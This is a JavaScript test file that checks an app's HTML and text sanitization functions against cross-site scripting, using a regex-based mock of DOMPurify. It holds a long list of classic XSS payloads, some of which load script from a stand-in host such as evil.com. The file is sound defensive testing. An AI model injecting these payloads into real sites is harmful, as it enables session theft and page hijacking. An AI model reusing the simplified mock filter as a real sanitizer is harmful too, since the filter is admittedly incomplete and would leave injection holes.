/**
 * Property-Based Tests for security.js
 * **Validates: Requirements 5.3.1**
 *
 * Property 2: Input Sanitization
 * For any user input (text fields, search, validation input), the system SHALL
 * sanitize the input to prevent XSS attacks before rendering or sending to backend.
 */

const fc = require('fast-check');
const { sanitizeHTML, sanitizeText, escapeHTML } = require('./security');

// Mock DOMPurify for testing - simulates real DOMPurify behavior
global.DOMPurify = {
  sanitize: (html, config) => {
    // Mock that removes dangerous tags and attributes similar to real DOMPurify
    let sanitized = html;

    // Remove script tags (multiple passes to handle nested/split tags)
    for (let i = 0; i < 3; i++) {
      sanitized = sanitized.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
      sanitized = sanitized.replace(/<script[^>]*>/gi, '');
      sanitized = sanitized.replace(/<\/script>/gi, '');
    }

    // Remove iframe tags (including self-closing)
    sanitized = sanitized.replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '');
    sanitized = sanitized.replace(/<iframe[^>]*>/gi, '');

    // Remove svg tags
    sanitized = sanitized.replace(/<svg\b[^<]*(?:(?!<\/svg>)<[^<]*)*<\/svg>/gi, '');
    sanitized = sanitized.replace(/<svg[^>]*>/gi, '');

    // Remove body tags
    sanitized = sanitized.replace(/<body\b[^<]*(?:(?!<\/body>)<[^<]*)*<\/body>/gi, '');
    sanitized = sanitized.replace(/<body[^>]*>/gi, '');

    // Remove object and embed tags
    sanitized = sanitized.replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '');
    sanitized = sanitized.replace(/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi, '');

    // Remove link tags
    sanitized = sanitized.replace(/<link\b[^<]*(?:(?!<\/link>)<[^<]*)*<\/link>/gi, '');
    sanitized = sanitized.replace(/<link[^>]*>/gi, '');

    // Remove style tags
    sanitized = sanitized.replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '');

    // Remove meta tags
    sanitized = sanitized.replace(/<meta\b[^<]*(?:(?!<\/meta>)<[^<]*)*<\/meta>/gi, '');
    sanitized = sanitized.replace(/<meta[^>]*>/gi, '');

    // Remove base tags
    sanitized = sanitized.replace(/<base\b[^<]*(?:(?!<\/base>)<[^<]*)*<\/base>/gi, '');
    sanitized = sanitized.replace(/<base[^>]*>/gi, '');

    // Remove event handlers (onerror, onload, onclick, etc.)
    sanitized = sanitized.replace(/\s*on\w+\s*=\s*["'][^"']*["']/gi, '');
    sanitized = sanitized.replace(/\s*on\w+\s*=\s*[^\s>]*/gi, '');

    // Remove javascript: protocol from attributes
    sanitized = sanitized.replace(/javascript:/gi, '');

    // Remove data: protocol
    sanitized = sanitized.replace(/data:text\/html/gi, '');

    // Remove style attributes that might contain javascript
    sanitized = sanitized.replace(/\s*style\s*=\s*["'][^"']*javascript[^"']*["']/gi, '');
    sanitized = sanitized.replace(/\s*style\s*=\s*["'][^"']*expression[^"']*["']/gi, '');
    sanitized = sanitized.replace(/\s*style\s*=\s*["'][^"']*behavior[^"']*["']/gi, '');

    // Remove dangerous attributes
    sanitized = sanitized.replace(/\s*href\s*=\s*["']javascript:[^"']*["']/gi, '');
    sanitized = sanitized.replace(/\s*src\s*=\s*["']javascript:[^"']*["']/gi, '');
    sanitized = sanitized.replace(/\s*data\s*=\s*["']javascript:[^"']*["']/gi, '');
    sanitized = sanitized.replace(/\s*background\s*=\s*["']javascript:[^"']*["']/gi, '');

    // Remove tags that are not in the allowed list
    if (config && config.ALLOWED_TAGS) {
      const allowedTags = config.ALLOWED_TAGS.map(t => t.toLowerCase());
      // Remove tags not in allowed list (simplified - real DOMPurify is more sophisticated)
      const dangerousTags = ['table', 'td', 'tr', 'br', 'layer', 'bgsound', 'xss'];
      dangerousTags.forEach(tag => {
        if (!allowedTags.includes(tag)) {
          const regex = new RegExp(`<${tag}\\b[^<]*(?:(?!<\\/${tag}>)<[^<]*)*<\\/${tag}>`, 'gi');
          sanitized = sanitized.replace(regex, '');
          sanitized = sanitized.replace(new RegExp(`<${tag}[^>]*>`, 'gi'), '');
        }
      });
    }

    return sanitized;
  }
};

// Common XSS attack patterns
const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',
  '<button onclick=alert("XSS")>Click</button>',
  '<a href="javascript:alert(\'XSS\')">Link</a>',
  '<div onmouseover=alert("XSS")>Hover</div>',
  '<img src="x" onerror="alert(\'XSS\')">',
  '<object data="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
  '<svg><script>alert("XSS")</script></svg>',
  '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',
  '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
  '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
  '<IMG SRC="javascript:alert(\'XSS\');">',
  '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
  '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
  '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
  '<BODY ONLOAD=alert(\'XSS\')>',
  '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
  '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
  '<STYLE>@import\'javascript:alert("XSS")\';</STYLE>',
  '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
  '<XSS STYLE="behavior: url(xss.htc);">',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
  '<IMG SRC="  javascript:alert(\'XSS\');">',
  '<SCRIPT>a=/XSS/\nalert(a.source)</SCRIPT>',
  '<IMG DYNSRC="javascript:alert(\'XSS\')">',
  '<IMG LOWSRC="javascript:alert(\'XSS\')">',
  '<BGSOUND SRC="javascript:alert(\'XSS\');">',
  '<BR SIZE="&{alert(\'XSS\')}">',
  '<LAYER SRC="http://evil.com/xss.html"></LAYER>',
  '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS',
  '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
  '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
  '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-',
  '<SCRIPT a=">" SRC="http://evil.com/xss.js"></SCRIPT>',
  '<SCRIPT =">" SRC="http://evil.com/xss.js"></SCRIPT>',
  '<SCRIPT a=">" \'\' SRC="http://evil.com/xss.js"></SCRIPT>',
  '<SCRIPT "a=\'>\'" SRC="http://evil.com/xss.js"></SCRIPT>',
  '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://evil.com/xss.js"></SCRIPT>'
];

// Arbitraries for generating test data

/**
 * Generate a random XSS payload from the common patterns
 */
const xssPayloadArb = () => fc.constantFrom(...XSS_PAYLOADS);

/**
 * Generate a random string that might contain XSS attempts
 */
const potentialXSSStringArb = () => fc.oneof(
  // Pure XSS payload
  xssPayloadArb(),

  // XSS payload with surrounding text
  fc.tuple(fc.string(), xssPayloadArb(), fc.string()).map(([before, xss, after]) =>
    `${before}${xss}${after}`
  ),

  // Multiple XSS payloads
  fc.array(xssPayloadArb(), { minLength: 1, maxLength: 3 }).map(payloads =>
    payloads.join(' ')
  ),

  // XSS with HTML entities
  fc.tuple(xssPayloadArb(), fc.string()).map(([xss, text]) =>
    `${xss}&lt;${text}&gt;`
  ),

  // Script tag variations
  fc.tuple(
    fc.constantFrom('script', 'SCRIPT', 'ScRiPt', 'sCrIpT'),
    fc.string({ minLength: 1, maxLength: 50 })
  ).map(([tag, content]) =>
    `<${tag}>${content}</${tag}>`
  ),

  // Event handler variations
  fc.tuple(
    fc.constantFrom('img', 'svg', 'body', 'div', 'input', 'iframe'),
    fc.constantFrom('onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'),
    fc.string({ minLength: 1, maxLength: 50 })
  ).map(([tag, event, code]) =>
    `<${tag} ${event}="${code}">`
  ),

  // JavaScript protocol variations
  fc.tuple(
    fc.constantFrom('a', 'img', 'iframe', 'object', 'embed'),
    fc.constantFrom('href', 'src', 'data'),
    fc.string({ minLength: 1, maxLength: 50 })
  ).map(([tag, attr, code]) =>
    `<${tag} ${attr}="javascript:${code}">`
  ),

  // Data URI with HTML
  fc.string({ minLength: 1, maxLength: 50 }).map(code =>
    `<iframe src="data:text/html,<script>${code}</script>">`
  )
);

/**
 * Generate safe text that should pass through sanitization unchanged
 */
const safeTextArb = () => fc.oneof(
  // Plain text
  fc.string(),

  // Text with safe HTML
  fc.tuple(
    fc.constantFrom('p', 'b', 'i', 'em', 'strong', 'span', 'div'),
    fc.string()
  ).map(([tag, content]) =>
    `<${tag}>${content}</${tag}>`
  ),

  // Text with escaped HTML
  fc.string().map(str =>
    str.replace(/[&<>"']/g, char => {
      const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
      return map[char] || char;
    })
  ),

  // Numbers and special characters
  fc.oneof(
    fc.integer().map(String),
    fc.float().map(String),
    fc.constantFrom('!@#$%^&*()_+-=[]{}|;:,.<>?')
  )
);

/**
 * Generate text with control characters
 */
const textWithControlCharsArb = () => fc.tuple(
  fc.string(),
  fc.array(fc.integer({ min: 0, max: 31 }), { minLength: 1, maxLength: 5 }),
  fc.string()
).map(([before, controlChars, after]) => {
  const chars = controlChars.map(code => String.fromCharCode(code)).join('');
  return `${before}${chars}${after}`;
});

describe('Property-Based Tests: Input Sanitization', () => {
  describe('Property 2: Input Sanitization', () => {
    test('sanitizeHTML should remove all dangerous script tags', () => {
      fc.assert(
        fc.property(potentialXSSStringArb(), (input) => {
          const result = sanitizeHTML(input);

          // Should not contain script tags
          expect(result.toLowerCase()).not.toMatch(/<script[\s>]/);
          expect(result.toLowerCase()).not.toContain('</script>');
        }),
        { numRuns: 30 }
      );
    });

    test('sanitizeHTML should remove all event handlers', () => {
      fc.assert(
        fc.property(potentialXSSStringArb(), (input) => {
          const result = sanitizeHTML(input);

          // Should not contain event handlers
          expect(result).not.toMatch(/\son\w+\s*=/i);
          expect(result).not.toMatch(/onerror/i);
          expect(result).not.toMatch(/onload/i);
          expect(result).not.toMatch(/onclick/i);
          expect(result).not.toMatch(/onmouseover/i);
          expect(result).not.toMatch(/onfocus/i);
        }),
        { numRuns: 30 }
      );
    });

    test('sanitizeHTML should remove javascript: protocol', () => {
      fc.assert(
        fc.property(potentialXSSStringArb(), (input) => {
          const result = sanitizeHTML(input);

          // Should not contain javascript: protocol
          expect(result.toLowerCase()).not.toContain('javascript:');
        }),
        { numRuns: 30 }
      );
    });

    test('sanitizeHTML should remove dangerous iframe tags', () => {
      fc.assert(
        fc.property(potentialXSSStringArb(), (input) => {
          const result = sanitizeHTML(input);

          // Should not contain iframe tags
          expect(result.toLowerCase()).not.toMatch(/<iframe[\s>]/);
        }),
        { numRuns: 30 }
      );
    });

    test('sanitizeHTML should remove dangerous svg tags', () => {
      fc.assert(
        fc.property(potentialXSSStringArb(), (input) => {
          const result = sanitizeHTML(input);

          // Should not contain svg tags
          expect(result.toLowerCase()).not.toMatch(/<svg[\s>]/);
        }),
        { numRuns: 30 }
      );
    });

    test('sanitizeHTML should preserve safe HTML content', () => {
      fc.assert(
        fc.property(
          fc.tuple(
            fc.constantFrom('p', 'b', 'i', 'em', 'strong'),
            fc.string({ minLength: 1, maxLength: 100 })
          ),
          ([tag, content]) => {
            const input = `<${tag}>${content}</${tag}>`;
            const result = sanitizeHTML(input);

            // Should preserve the tag and content
            expect(result).toContain(content);
          }
        ),
        { numRuns: 20 }
      );
    });

    test('sanitizeHTML should handle empty and null inputs safely', () => {
      expect(sanitizeHTML('')).toBe('');
      expect(sanitizeHTML(null)).toBe('');
      expect(sanitizeHTML(undefined)).toBe('');
    });

    test('sanitizeHTML should be idempotent (sanitizing twice gives same result)', () => {
      fc.assert(
        fc.property(potentialXSSStringArb(), (input) => {
          const result1 = sanitizeHTML(input);
          const result2 = sanitizeHTML(result1);

          expect(result1).toBe(result2);
        }),
        { numRuns: 20 }
      );
    });

    test('escapeHTML should escape all dangerous characters', () => {
      fc.assert(
        fc.property(potentialXSSStringArb(), (input) => {
          const result = escapeHTML(input);

          // Should not contain unescaped dangerous characters
          expect(result).not.toMatch(/<(?!&lt;)/);
          expect(result).not.toMatch(/>(?!&gt;)/);
          expect(result).not.toMatch(/"(?!&quot;)/);

          // Should contain escaped versions if input had dangerous chars
          if (input.includes('<')) {
            expect(result).toContain('&lt;');
          }
          if (input.includes('>')) {
            expect(result).toContain('&gt;');
          }
          if (input.includes('"')) {
            expect(result).toContain('&quot;');
          }
          if (input.includes('&')) {
            expect(result).toContain('&amp;');
          }
        }),
        { numRuns: 30 }
      );
    });

    test('escapeHTML should prevent script execution when rendered', () => {
      fc.assert(
        fc.property(xssPayloadArb(), (payload) => {
          const result = escapeHTML(payload);

          // Escaped result should not contain executable script tags
          expect(result).not.toContain('<script>');
          expect(result).not.toContain('</script>');

          // Should contain escaped versions
          if (payload.includes('<script>')) {
            expect(result).toContain('&lt;script&gt;');
          }
        }),
        { numRuns: 20 }
      );
    });

    test('escapeHTML should be idempotent', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result1 = escapeHTML(input);
          const result2 = escapeHTML(result1);

          // Second escape should escape the & from first escape
          // This is expected behavior - not truly idempotent but safe
          expect(result2).toBeDefined();
          expect(typeof result2).toBe('string');
        }),
        { numRuns: 20 }
      );
    });

    test('sanitizeText should remove control characters', () => {
      fc.assert(
        fc.property(textWithControlCharsArb(), (input) => {
          const result = sanitizeText(input);

          // Should not contain control characters (except \n, \t, \r)
          // eslint-disable-next-line no-control-regex
          expect(result).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/);
        }),
        { numRuns: 20 }
      );
    });

    test('sanitizeText should enforce maximum length', () => {
      fc.assert(
        fc.property(
          fc.string({ minLength: 100, maxLength: 20000 }),
          fc.integer({ min: 10, max: 1000 }),
          (input, maxLength) => {
            const result = sanitizeText(input, { maxLength });

            expect(result.length).toBeLessThanOrEqual(maxLength);
          }
        ),
        { numRuns: 20 }
      );
    });

    test('sanitizeText should trim whitespace', () => {
      fc.assert(
        fc.property(
          fc.tuple(fc.string(), fc.string({ minLength: 1 }), fc.string()),
          ([before, content, after]) => {
            const input = `${before}  ${content}  ${after}`;
            const result = sanitizeText(input);

            // Should not start or end with whitespace
            expect(result).toBe(result.trim());
          }
        ),
        { numRuns: 20 }
      );
    });

    test('sanitizeText should handle empty and null inputs safely', () => {
      expect(sanitizeText('')).toBe('');
      expect(sanitizeText(null)).toBe('');
      expect(sanitizeText(undefined)).toBe('');
      expect(sanitizeText('   ')).toBe('');
    });

    test('Combined: sanitizeHTML then render should be safe', () => {
      fc.assert(
        fc.property(xssPayloadArb(), (payload) => {
          const sanitized = sanitizeHTML(payload);

          // After sanitization, should not contain executable script tags or event handlers
          expect(sanitized.toLowerCase()).not.toMatch(/<script[\s>]/);
          expect(sanitized).not.toMatch(/\son\w+\s*=/i);

          // Should not contain javascript: protocol in attributes
          if (payload.toLowerCase().includes('javascript:')) {
            expect(sanitized.toLowerCase()).not.toContain('javascript:');
          }
        }),
        { numRuns: 30 }
      );
    });

    test('All known XSS payloads should be neutralized', () => {
      XSS_PAYLOADS.forEach((payload) => {
        const sanitized = sanitizeHTML(payload);

        // Should not contain dangerous executable patterns
        expect(sanitized.toLowerCase()).not.toMatch(/<script[\s>]/);
        expect(sanitized.toLowerCase()).not.toMatch(/<iframe[\s>]/);
        expect(sanitized).not.toMatch(/\son\w+\s*=/i);

        // Should not contain javascript: protocol
        if (payload.toLowerCase().includes('javascript:')) {
          expect(sanitized.toLowerCase()).not.toContain('javascript:');
        }
      });
    });

    test('Sanitization should not break valid user content', () => {
      const validInputs = [
        'Hello, World!',
        'User <name> entered data',
        'Price: $100 & tax',
        'Email: user@example.com',
        'Phone: +1-234-567-8900',
        'Math: 2 + 2 = 4',
        'Quote: "Hello" and \'Goodbye\'',
        'Path: C:\\Users\\Documents',
        'URL: https://example.com/path?query=value'
      ];

      validInputs.forEach((input) => {
        const sanitized = sanitizeText(input);

        // Should preserve the core content
        expect(sanitized.length).toBeGreaterThan(0);
        expect(typeof sanitized).toBe('string');
      });
    });

    test('Sanitization should be consistent across multiple calls', () => {
      fc.assert(
        fc.property(potentialXSSStringArb(), (input) => {
          const result1 = sanitizeHTML(input);
          const result2 = sanitizeHTML(input);
          const result3 = sanitizeHTML(input);

          expect(result1).toBe(result2);
          expect(result2).toBe(result3);
        }),
        { numRuns: 20 }
      );
    });

    test('Edge case: Very long XSS payloads should be handled', () => {
      fc.assert(
        fc.property(
          fc.array(xssPayloadArb(), { minLength: 10, maxLength: 50 }),
          (payloads) => {
            const input = payloads.join('');
            const result = sanitizeHTML(input);

            // Should not crash and should remove dangerous tags
            expect(typeof result).toBe('string');
            expect(result.toLowerCase()).not.toMatch(/<script[\s>]/);
            expect(result.toLowerCase()).not.toMatch(/<iframe[\s>]/);
          }
        ),
        { numRuns: 10 }
      );
    });

    test('Edge case: Nested XSS attempts should be neutralized', () => {
      fc.assert(
        fc.property(
          fc.tuple(xssPayloadArb(), xssPayloadArb()),
          ([payload1, payload2]) => {
            const input = `${payload1}${payload2}`;
            const result = sanitizeHTML(input);

            // Should remove all dangerous tags
            expect(result.toLowerCase()).not.toMatch(/<script[\s>]/);
            expect(result.toLowerCase()).not.toMatch(/<iframe[\s>]/);

            // Should not contain javascript: protocol
            if (input.toLowerCase().includes('javascript:')) {
              expect(result.toLowerCase()).not.toContain('javascript:');
            }
          }
        ),
        { numRuns: 20 }
      );
    });

    test('Edge case: XSS with Unicode and special encodings', () => {
      const unicodePayloads = [
        '<script>alert\u0028"XSS"\u0029</script>',
        '<img src=x onerror=\u0061lert("XSS")>',
        '<svg onload=\u0061\u006c\u0065\u0072\u0074("XSS")>'
      ];

      unicodePayloads.forEach((payload) => {
        const result = sanitizeHTML(payload);

        // Should still detect and remove dangerous content
        expect(result.toLowerCase()).not.toMatch(/<script[\s>]/);
        expect(result).not.toMatch(/\son\w+\s*=/i);
      });
    });
  });
});

